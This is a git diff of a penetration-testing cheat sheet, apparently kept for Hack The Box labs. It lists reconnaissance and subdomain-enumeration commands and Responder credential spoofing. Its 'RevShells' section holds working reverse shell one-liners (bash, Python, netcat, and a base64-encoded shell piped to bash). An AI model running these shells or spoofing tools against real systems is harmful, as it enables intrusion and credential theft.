@@ -8,8 +8,17 @@ find . -type f -name "*.db" 2>/dev/null
 md5sum <filename> 
 #gets md5 hash of file
 
-find / -type d -name '.git'
+find / -type d -name 'postgresql' 2>/dev/null
 #finds dirs with name
+
+grep -Rni '.' -e 'something'
+#finds all files with "something" in them
+
+awk '{print $1}'
+#prints first word of string 
+
+sort -u
+#removes duplicates when using cat
 
 cd /var/mail && cd /var/spool/mail
 #check for mail
@@ -29,6 +38,12 @@ netstat -tulpn
 grep -i something
 #case insensitive search
 
+tar -cvf folder.tar.gz folder
+#archives folder into tarball for easier movement
+
+tar -xf folder.tar.gz
+#unizps tarball
+
 ```
 
 ${IFS} can be used in place of whitespace when no whitespace allowed
@@ -37,36 +52,68 @@ jd-gui used to decompile jar files
 
 ## Enumeration
 
+### Ports
+
 ```bash
 mkdir nmap
 nmap -A -T4 -v -oN nmap/initial $IP 
 sudo masscan -p1-65535,U:1-65535 $IP --rate=1000 -e tun0 -oL nmap/masscan
+```
 
+Always google open ports, not just services shown/guessed by nmap
+
+if nmap only shows scanning 2 ports with -p- use -Pn
+
+### Subdomains
+
+```bash
 hosts
 #alias for 'sudo nano /etc/hosts'
-
-dirsearch -u $URL
-gobuster dir -u $URL -w /home/kali/directory-list-2.3-medium.txt
 
 ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb -H "Host:FUZZ.devvortex.htb" -mc 200,204,301,307,401,403,405,500
 #fuzzes subdomains
 
+dig axfr @<ip> <hostname>
+#gets other hostnames from port 53 of server (zone transfer)
+
+amass enum -passive -d <domain>
+#scrapes for any records of domain
+
+sublist3r -d <domain>
+#searches for subdomains
+```
+
+https://crt.sh will show all certificates, can show subdomains
+
+
+### Subdirectories
+```bash
+
+dirsearch -u $URL
+gobuster dir -u $URL -w /home/kali/directory-list-2.3-medium.txt
+
 wpscan --url <url> -v -e 
 
-sudo responder -wA -I tun0 -v 
-#Spoofs every server imaginable to get info on connection attempts
-
-dig axfr @<ip> <hostname>
-#gets other hostnames from port 53 of server
-
 ```
-Always google open ports, not just services shown/guessed by nmap
-
-.dockerenv in / means you're in a docker container
 
 gitdump used to dump .git directories 
 
-if nmap only shows scanning 2 ports with -p- use -Pn
+### Other
+```bash
+sudo responder -wA -I tun0 -v 
+#Spoofs every server imaginable to get info on connection attempts
+
+theHarvester -d <domain> -b bing/intelx | tee "domain.txt"
+#will look for any hosts, emails, ips and urls related
+
+cat domain.txt | waybackurls > domainwb.txt
+#will list very many waybackurls of all domains in domain.txt
+
+cat domainwb.txt | httprobe > validurls.txt
+#will find all urls that will resolve
+```
+
+.dockerenv in / means you're in a docker container
 
 
 ## MySQL
@@ -95,9 +142,14 @@ psql -h <localhost> -U <username>
 ## RevShells
 
 ```bash
-bash -i >& /dev/tcp/10.10.15.59/9002 0>&1
-nc 10.10.14.54 8888 -e bash
+bash -i >& /dev/tcp/10.10.15.184/9002 0>&1
+export RHOST='10.10.15.184';export RPORT=9002;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\\"RHOST\\"),int(os.getenv(\\"RPORT\\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\"bash\\")'
 
+nc -e /bin/bash 10.10.15.184 9002
+```
+Be careful to not rush things. Try using &&, but also run commands (wget, chmod then ./) one at a time. Sometimes RCE doesn't like &&/;/&
+
+```bash
 echo "bash -i >& /dev/tcp/10.10.15.59/8000 0>&1" | base64
 echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NC84ODg4IDA+JjE= | base64 -d | bash
 
